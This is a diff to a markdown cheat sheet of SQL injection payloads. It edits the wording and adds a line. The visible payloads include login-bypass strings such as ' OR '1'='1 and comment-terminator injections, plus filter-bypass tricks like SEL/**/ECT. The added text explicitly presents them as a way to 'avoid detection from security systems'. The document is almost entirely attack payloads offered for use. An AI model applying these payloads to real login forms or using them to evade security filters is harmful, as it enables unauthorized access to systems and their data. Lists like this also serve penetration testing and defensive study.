@@ -1,6 +1,6 @@
 # SQL Injection Payloads
 ## Bypass password
-These commands can be used to try and bypass password restricted logins
+These inputs can be used to bypass password restricted logins
 ```sql
 username' OR '1'='1
 username'
@@ -11,10 +11,11 @@ username'--
 ```sql
 --
 #
-/* *
+/* */
 ```
 
 ## Filter Bypass
+Use these to avoid detection from security systems
 ```sql
 SEL/**/ECT
 ' like '-- Use this instead of '='
